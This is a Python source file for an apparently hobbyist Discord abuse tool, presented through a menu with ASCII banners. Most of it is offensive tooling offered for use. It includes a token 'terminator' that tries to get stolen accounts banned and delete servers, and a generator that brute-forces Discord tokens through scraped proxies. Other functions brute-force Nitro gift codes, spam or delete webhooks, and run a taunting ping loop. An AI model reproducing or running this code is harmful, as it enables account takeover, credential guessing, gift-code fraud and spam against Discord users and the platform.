try:
    from colorama import Fore, Style
    from os import system as cmd
    import requests
    from lxml.html import fromstring
    import os
    import time
    import sys
    import random
    import string
    import base64
    from itertools import cycle
    from pypresence import Presence
except:
    print("[ERROR] - You need to have these modules installed:")
    print("     - requests")
    print("     - colorama")
    print("     - lxml")

inp = f"[{Fore.MAGENTA}>{Style.RESET_ALL}] $ "
err = f"[{Fore.RED}-{Style.RESET_ALL}]"
inf = f"[{Fore.YELLOW}i{Style.RESET_ALL}]"
out = f"[{Fore.GREEN}:{Style.RESET_ALL}]"
log = f"[{Fore.CYAN}={Style.RESET_ALL}]"

###################
## -Discord RPC- ##
###################

buttonList = [
    {
        "label": "GitHub",
        "url": "https://github.com/TerrificTable"
    },
    {
        "label": "This Programm",
        "url": "https://github.com/TerrificTable/"
    }
]

rpc = Presence("896386163579961364")
rpc.connect()
rpc.update(
    details="Terrific's Tool Collection",
    large_text="TerrificTools",
    large_image="webhookico",
    small_text="by Terrific",
    small_image="me",
    buttons=buttonList,
    start=time.time()
)


def slowprint(s, c, newLine=True):
    for c in s + '\n':
        sys.stdout.write(c)
        sys.stdout.flush()
        time.sleep(1. / 30)


def logo():
    return f'''{Fore.CYAN}
          _____              _  __ _              _____           _                   
         |_   _|__ _ __ _ __(_)/ _(_) ___ ___    |_   _|__   ___ | |___ {Fore.MAGENTA}   _ __  _   _ {Fore.CYAN}
           | |/ _ \ '__| '__| | |_| |/ __/ __|_____| |/ _ \ / _ \| / __|{Fore.MAGENTA}  | '_ \| | | |{Fore.CYAN}
           | |  __/ |  | |  | |  _| | (__\__ \_____| | (_) | (_) | \__ \{Fore.MAGENTA} _| |_) | |_| |{Fore.CYAN}
           |_|\___|_|  |_|  |_|_| |_|\___|___/     |_|\___/ \___/|_|___/{Fore.MAGENTA}(_) .__/ \__, |{Fore.CYAN}
                                                                         {Fore.MAGENTA} |_|    |___/ {Fore.CYAN}{Style.RESET_ALL}'''


def webhooklogo():
    return f'''{Fore.RED}

    █     █░▓█████  ▄▄▄▄    ██░ ██  ▒█████   ▒█████   ██ ▄█▀   ▄▄▄█████▓ ▒█████   ▒█████   ██▓      ██████ 
    ▓█░ █ ░█░▓█   ▀ ▓█████▄ ▓██░ ██▒▒██▒  ██▒▒██▒  ██▒ ██▄█▒    ▓  ██▒ ▓▒▒██▒  ██▒▒██▒  ██▒▓██▒    ▒██    ▒ 
    ▒█░ █ ░█ ▒███   ▒██▒ ▄██▒██▀▀██░▒██░  ██▒▒██░  ██▒▓███▄░    ▒ ▓██░ ▒░▒██░  ██▒▒██░  ██▒▒██░    ░ ▓██▄   
    ░█░ █ ░█ ▒▓█  ▄ ▒██░█▀  ░▓█ ░██ ▒██   ██░▒██   ██░▓██ █▄    ░ ▓██▓ ░ ▒██   ██░▒██   ██░▒██░      ▒   ██▒
    ░░██▒██▓ ░▒████▒░▓█  ▀█▓░▓█▒░██▓░ ████▓▒░░ ████▓▒░▒██▒ █▄     ▒██▒ ░ ░ ████▓▒░░ ████▓▒░░██████▒▒██████▒▒
    ░ ▓░▒ ▒  ░░ ▒░ ░░▒▓███▀▒ ▒ ░░▒░▒░ ▒░▒░▒░ ░ ▒░▒░▒░ ▒ ▒▒ ▓▒     ▒ ░░   ░ ▒░▒░▒░ ░ ▒░▒░▒░ ░ ▒░▓  ░▒ ▒▓▒ ▒ ░
    ▒ ░ ░   ░ ░  ░▒░▒   ░  ▒ ░▒░ ░  ░ ▒ ▒░   ░ ▒ ▒░ ░ ░▒ ▒░       ░      ░ ▒ ▒░   ░ ▒ ▒░ ░ ░ ▒  ░░ ░▒  ░ ░
    ░   ░     ░    ░    ░  ░  ░░ ░░ ░ ░ ▒  ░ ░ ░ ▒  ░ ░░ ░      ░      ░ ░ ░ ▒  ░ ░ ░ ▒    ░ ░   ░  ░  ░  
        ░       ░  ░ ░       ░  ░  ░    ░ ░      ░ ░  ░  ░                   ░ ░      ░ ░      ░  ░      ░  
                        ░                                                                                 
                        ░                                                                         {Style.RESET_ALL}'''


def get_proxies():
    try:
        url = 'https://sslproxies.org/'
        response = requests.get(url)
        parser = fromstring(response.text)
        proxies = set()
        for i in parser.xpath('//tbody/tr')[:10]:
            if i.xpath('.//td[7][contains(text(),"yes")]'):
                proxy = ":".join([i.xpath('.//td[1]/text()')[0],
                                  i.xpath('.//td[2]/text()')[0]])
                proxies.add(proxy)
        return proxies
    except KeyboardInterrupt:
        pass
    except:
        pass


def proxyscraper():
    try:
        cmd("cls;clear")
        cmd("title [Terrifics-Tools.py - ProxyScraper]")

        url = 'https://api.openproxylist.xyz/http.txt'
        r = requests.get(url)
        results = r.text
        with open("http.txt", "w") as file:
            file.write(results)
        print(f' {out} {Fore.LIGHTGREEN_EX}done http{Style.RESET_ALL}')

        url = 'https://api.openproxylist.xyz/socks4.txt'
        r = requests.get(url)
        results = r.text
        with open("socks4.txt", "w") as file:
            file.write(results)
        print(f' {out} {Fore.LIGHTGREEN_EX}done socks4{Style.RESET_ALL}')

        url = 'https://api.openproxylist.xyz/socks5.txt'
        r = requests.get(url)
        results = r.text
        with open("socks5.txt", "w") as file:
            file.write(results)
        print(f' {out} {Fore.LIGHTGREEN_EX}done socks4{Style.RESET_ALL}')
        time.sleep(2)
    except KeyboardInterrupt:
        main()
    except:
        main()


def terminate():
    try:
        cmd("cls;clear")
        cmd("title [Terrifics-Tools.py - Terminator]")
        print(f" {inf} Enter Token")
        token = input(f" {inp} ")
        while True:
            print("Terminating token...")
            api = requests.get("https://discordapp.com/api/v6/invite/hwcVZQw")
            data = api.json()
            check = requests.get(
                "https://discordapp.com/api/v6/guilds/" +
                data['guild']['id'],
                headers={
                    "Authorization": token})
            stuff = check.json()
            requests.post(
                "https://discordapp.com/api/v6/invite/hwcVZQw",
                headers={
                    "Authorization": token})
            requests.delete(
                "https://discordapp.com/api/v6/guiilds" +
                data['guild']['id'],
                headers={
                    "Authorization": token})

            if stuff['code'] == 0:
                print("Successfully disabled!")
                print("Disabler by NullCode and Giggl3z")
                time.sleep(2)
                break
    except KeyboardInterrupt:
        main()
    except:
        main()


def pinger():
    cmd("cls;clear")
    cmd("title [Terrifics-Tools.py - Pinger]")
    print(f" {inf} Enter IP")
    ip = str(input(f" {inp} "))

    while True:
        if cmd("ping -n 1 " + ip + ">nul") == 0:
            print(ip + " is alive!")
            cmd("color " + str(random.randrange(0, 9)))
        else:
            print(ip + " Get downed SKID")
            cmd("color " + str(random.randrange(0, 9)))
            time.sleep(2)
            cmd("mode con:cols=120lines=20")


def Tokengen():
    try:
        N = input("How many you want?: ")
        count = 0
        url = "https://discordapp.com/api/v6/users/@me/library"

        while(int(count) < int(N)):
            tokens = []
            base64_string = "=="
            while(base64_string.find("==") != -1):
                sample_string = str(
                    random.randint(
                        000000000000000000,
                        999999999999999999))
                sample_string_bytes = sample_string.encode("ascii")
                base64_bytes = base64.b64encode(sample_string_bytes)
                base64_string = base64_bytes.decode("ascii")
            else:
                token = base64_string + "." + random.choice(
                    string.ascii_letters).upper() + ''.join(
                    random.choice(
                        string.ascii_letters + string.digits) for _ in range(5)) + "." + ''.join(
                    random.choice(
                        string.ascii_letters + string.digits) for _ in range(27))
                count += 1
                tokens.append(token)
            proxies = get_proxies()
            proxy_pool = cycle(proxies)

            for token in tokens:
                proxy = next(proxy_pool)
                header = {
                    "Content-Type": "application/json",
                    "authorization": token
                }
                r = requests.get(url, headers=header, proxies={"http": proxy})
                if r.status_code == 200:
                    print("f'{Fore.LIGHTGREEN_EX}Valid{Fore.RESET} | {token}'")
                    with open("workingtokens.txt", "a") as f:
                        f.write(token + "\n")

                elif "rate limited." in r.text:
                    print(f" {err} You are being rate limited.")

                else:
                    print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {token}')
            tokens.remove(token)
    except KeyboardInterrupt:
        main()
    except:
        main()


def checkwebhook(w):
    try:
        check = requests.get(w, params={'wait': True})
        if check.ok or check:
            return True
        else:
            return False
    except:
        return False


def sender():
    try:
        cmd('cls; clear')
        cmd("title [Terrific's Webhook-Tools - Spammer]")
        print(f'{log} [WEBHOOK-TOOLS] - Webhook spammer\n')
        webhook = input(f" {inp} Webhook Url: ")
        if checkwebhook(webhook):
            cu = input(
                f"\n {inp} Do you want to put a Custom Webhook name inside (it changes the name of the Webhook if it sends a message) [y/n]: ")
            if str(cu) == "y":
                username = input(f" {inp} Username: ")
            av = input(
                f"\n {inp} Do you want the Webhook to have a Custom avatar [y/n]: ")
            if str(av) == "y":
                avatarurl = input(f" {inp} Avatar-Url (A Image URL): ")
            message = input(f"\n {inp} Message: ")
            amt = input(f" {inp} Amout of Messages send: ")
            print("")

            if webhook != "" or message != "" or str(amt) != "":
                for i in range(int(amt)):
                    try:
                        if str(cu) == "y" and str(av) == "y":
                            response = requests.post(webhook, json={
                                                     "content": message, "username": username, "avatar_url": avatarurl}, params={'wait': True})
                        elif str(cu) == "y" and str(av) == "n":
                            response = requests.post(
                                webhook, json={"content": message, "username": username}, params={'wait': True})
                        elif str(cu) == "n" and str(av) == "y":
                            response = requests.post(webhook, json={
                                                     "content": message, "avatar_url": avatarurl}, params={'wait': True})
                        elif str(cu) == "n" and str(av) == "n":
                            response = requests.post(
                                webhook, json={"content": message}, params={'wait': True})
                    except Exception as e:
                        print(e + ", press [ENTER] to return")
                        input()
                        main()

                    if response.status_code == 204 or response.status_code == 200:
                        print(f" {out} - Message sent")
                    elif response.status_code == 429:
                        print(
                            f" {log} - Rate limited ({response.json()['retry_after']}ms)")
                        time.sleep(response.json()["retry_after"] / 1000)
                    else:
                        print(
                            f" {err} - Error code: {response.status_code}, press [ENTER] to return")
                        input()
                        main()
                    time.sleep(.5)
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            sender()
        print(f" {err} - Invalid input, press [ENTER] to return")
        input()
        main()
    except KeyboardInterrupt:
        main()
    except:
        main()


def spammer():
    try:
        cmd('cls; clear')
        cmd("title [Terrific's Webhook-Tools - Spammer]")
        print(f'{log} [WEBHOOK-TOOLS] - Webhook spammer\n')
        webhook = input(f" {inp} Webhook Url: ")
        if checkwebhook(webhook):
            message = input(f" {inp} Message: ")
            print("")
            try:
                while True:
                    try:
                        response = requests.post(
                            webhook, json={"content": message}, params={'wait': True})
                    except Exception as e:
                        print(e + ", press [ENTER] to return")
                        input()
                        main()

                    if response.status_code == 204 or response.status_code == 200:
                        print(f" {out} - Message sent")

                    elif response.status_code == 429:
                        print(
                            f" {log} - Rate limited ({response.json()['retry_after']}ms)")
                        time.sleep(response.json()["retry_after"] / 1000)

                    else:
                        print(
                            f" {err} - Error code: {response.status_code}, press [ENTER] to return")
                        input()
                        main()
                    time.sleep(.5)
            except:
                print(f" {log} Press [ENTER] to return")
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            spammer()
    except KeyboardInterrupt:
        main()
    except:
        main()


def deleter():
    try:
        cmd('cls; clear')
        cmd("title [Terrific's Webhook-Tools - Deleter]")
        print(f'{log} [WEBHOOK-TOOLS] - Webhook deleter\n')
        webhook = input(f" {inp} Webhook: ")
        if checkwebhook(webhook):
            if webhook != "":
                try:
                    requests.delete(webhook.rstrip())
                    print(
                        f' {out} - Webhook has been deleted, press [ENTER] to return')
                    input()
                    main()
                except Exception as e:
                    print(
                        f" {err} - Webhook could not be deleted, press [ENTER] to return")
                    input()
                    main()
            else:
                print(f" {err} - Invalid Input, press [ENTER] to return")
                input()
                main()
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            deleter()
    except KeyboardInterrupt:
        main()
    except:
        main()


def checker():
    try:
        cmd("cls; clear")
        cmd("title [Terrific's Webhook-Tools - Checker]")
        print(f"{log} [WEBHOOK-TOOLS] - Webhook checker\n")
        webhook = input(f" {inp} Webhook: ")
        try:
            r = requests.get(webhook)
            if r.ok == False:
                print(f"{log} [WEBHOOK-TOOLS] - Webhook Invalid")
                input()
                main()
            elif r.ok == True:
                print(
                    f"{log} [WEBHOOK-TOOLS] - Webhook Works, press [ENTER] to return")
                input()
                main()
        except Exception as e:
            print(
                f"{err} [WEBHOOK-TOOLS] - Webhook could not be checked\n{err} [WEBHOOK-TOOLS] - Error Message: {e}")
            input()
            main()
    except KeyboardInterrupt as e:
        main()
    except Exception as e:
        main()


def sendmessage(w, m):
    try:
        r = requests.post(w, json={"content": m}, params={'wait': True})
        if r.ok:
            print(f" {out} Message sent")
        else:
            print(f" {err} Message failed to sent")
    except:
        print(f" {err} Message failed to sent")


def chatsession():
    cmd('cls; clear')
    cmd("title [Terrific's Webhook-Tools - ChatSession]")
    print(f'{log} [WEBHOOK-TOOLS] - Chat Session\n\n\n')

    try:
        print(f" {inf} Press Ctrl + C to exit Chat session\n")
        webhook = input(f" {inp} Webhook: ")
        if checkwebhook(webhook):
            print(f"\n\n {inf} Input Message")
            while True:
                message = input(f" {inp} ")
                sendmessage(webhook, message)
        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            chatsession()
    except KeyboardInterrupt:
        main()
    except:
        main()


def changeinfo():
    try:
        cmd('cls; clear')
        cmd("mode 115, 30")
        cmd("title [Terrific's Webhook-Tools - ChangeInfo]")
        print(f'{log} [WEBHOOK-TOOLS] - Change Info\n\n')

        webhook = input(f" {inp} Webhook URL: ")

        if checkwebhook(webhook):
            print(f"""\n
            [x]=====================[x]
            ║ 1  =  Change Name     ║
            ║ 2  =  Change Avatar   ║
            ║ 3  =  Return to Menu  ║
            ║ X  =  Exit            ║
            [x]=====================[x]
            """)
            i = input(f" {inp} ")

            if str(i) == "1":
                name = input(f" {inp} Name: ")
                r = requests.patch(webhook, json={"name": name})
                if r.ok:
                    print(f" {out} Succesfully Changed Name")
                else:
                    print(f" {err} Failed to Change Name")

            elif str(i) == "2":
                avatar = input(f" {inp} Image URL: ")
                r = requests.patch(webhook, json={"avatar_url": avatar})
                if r.ok:
                    print(f" {out} Succesfully Changed Name")
                else:
                    print(f" {err} Failed to Change Name")

            elif str(i) == "3":
                main()

            elif str(i).lower() == "x":
                exit()

            else:
                print(f" {err} Invalid Input, pres [ENTER] to return")
                input()
                changeinfo()

        else:
            print(f" {err} Invalid Webhook, press [ENTER] to return")
            input()
            changeinfo()

    except KeyboardInterrupt:
        main()
    except:
        main()


def generateCheck():
    try:
        os.system('cls' if os.name == 'nt' else 'clear')
        while True:
            code = ''.join(random.choices(
                string.ascii_uppercase + string.digits + string.ascii_lowercase,
                k=16
            ))

            url = f"https://discordapp.com/api/v6/entitlements/gift-codes/{code}?with_application=false&with_subscription_plan=true"
            s = requests.session()
            response = s.get(url)

            nitro = f'{Fore.LIGHTBLACK_EX}https://discord.gift/{Fore.RESET}' + code

            if 'subscription_plan' in response.text:
                print(f'{Fore.LIGHTGREEN_EX}Valid code{Fore.RESET} | {nitro}')
                print("FOUND CODE")
                with open("code.txt", "w") as f:
                    f.write(nitro)
                break

            else:
                print(f'{Fore.LIGHTRED_EX}Invalid{Fore.RESET} | {nitro}')
                continue
    except KeyboardInterrupt:
        main()
    except:
        main()


def main():
    try:
        cmd("cls;clear")
        cmd("title [Terrifics-Tools.py - Mainmenu]")
        cmd("mode 115, 30")
        print(logo())

        time.sleep(1)
        slowprint(
            f'{Fore.LIGHTBLACK_EX}                    Made by: {Fore.RED}Terrific{Style.RESET_ALL}', .02)
        time.sleep(1)

        print(f'''\n\n
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[1]{Style.RESET_ALL} Webhook Tools   {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[2]{Style.RESET_ALL} Discord Tool    {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[3]{Style.RESET_ALL} ProxyScrape     {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[4]{Style.RESET_ALL} Pinger          {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[X]{Style.RESET_ALL} Exit            {Fore.LIGHTMAGENTA_EX}║
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        option = input(f" {inp} ")
        if str(option) == "1":
            webhooktools()
        elif str(option) == "2":
            discordtools()
        elif str(option) == "3":
            proxyscraper()
        elif str(option) == "4":
            pinger()
        else:
            exit()
    except KeyboardInterrupt:
        main()
    except:
        main()


def discordtools():
    try:
        cmd('cls; clear')
        cmd(f'mode 115, 30')
        cmd("title [Terrifics-Tools.py - Discord-Tools]")
        print(f'''
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=========================={Fore.YELLOW}[x]
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[1]{Style.RESET_ALL} Terminate Token       {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[2]{Style.RESET_ALL} Generate Token        {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[3]{Style.RESET_ALL} Nitro Gen and Checker {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║  {Fore.RED}[X]{Style.RESET_ALL} Exit                  {Fore.LIGHTMAGENTA_EX}║
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=========================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        i = input(f" {inp}")
        if str(i) == "1":
            terminate()
            input()
            discordtools()
        elif str(i) == "2":
            Tokengen()
            input()
            discordtools()
        elif str(i) == "3":
            generateCheck()
            input()
            discordtools()
        elif str(i) == "x":
            exit()
        else:
            print(f" {err} - Invalid Input")
            input()
            main()
    except KeyboardInterrupt:
        main()
    except:
        main()


def webhooktools():
    try:
        cmd('cls; clear')
        cmd(f'mode 115, 30')
        cmd("title [Terrifics-Tools.py - Webhook-Tools]")
        print(webhooklogo())
        print(f'''
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==============={Fore.YELLOW}[x]
            {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[1]{Style.RESET_ALL} Sender       {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[4]{Style.RESET_ALL} Checker      {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[2]{Style.RESET_ALL} Spammer      {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[5]{Style.RESET_ALL} SingleUtils  {Fore.LIGHTMAGENTA_EX}║
            {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[3]{Style.RESET_ALL} Deleter      {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[X]{Style.RESET_ALL} Exit         {Fore.LIGHTMAGENTA_EX}║
            {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}=================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==============={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        i = input(f" {inp} ")
        if str(i) == str(1):
            sender()
            input()
            webhooktools()
        elif str(i) == str(2):
            spammer()
            input()
            webhooktools()
        elif str(i) == str(3):
            deleter()
            input()
            webhooktools()
        elif str(i) == str(4):
            checker()
            input()
            webhooktools()
        elif str(i) == str(5):
            singleutils()
            input()
            webhooktools()
        elif str(i).lower() == "x":
            exit()
        else:
            print(f" {err} - Invalid Input")
            input()
            webhooktools()
    except KeyboardInterrupt:
        main()
    except:
        main()


def singleutils():
    try:
        cmd("cls")
        cmd("mode 115, 30")
        cmd("title [Terrific's Webhook-Tools - SingleUtils]")
        print(f'''
        {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]
        {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[1] {Style.RESET_ALL}Chat Session    {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[3] {Style.RESET_ALL}Return to Menu  {Fore.LIGHTMAGENTA_EX}║
        {Fore.LIGHTMAGENTA_EX} ║ {Fore.RED}[2] {Style.RESET_ALL}Change Info     {Fore.LIGHTMAGENTA_EX}║  {Fore.RED}[X] {Style.RESET_ALL}Exit            {Fore.LIGHTMAGENTA_EX}║
        {Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}==================={Fore.YELLOW}[x]{Fore.LIGHTMAGENTA_EX}===================={Fore.YELLOW}[x]{Style.RESET_ALL}''')
        i = input(f" {inp} ")
        if str(i) == str(1):
            chatsession()
        elif str(i) == str(2):
            changeinfo()
        elif str(i) == str(3):
            main()
        elif str(i).lower() == "x":
            exit()
        else:
            print(f" {err} Invalid Input, pres [ENTER] to return")
            input()
            singleutils()
    except KeyboardInterrupt:
        main()
    except:
        main()
main()
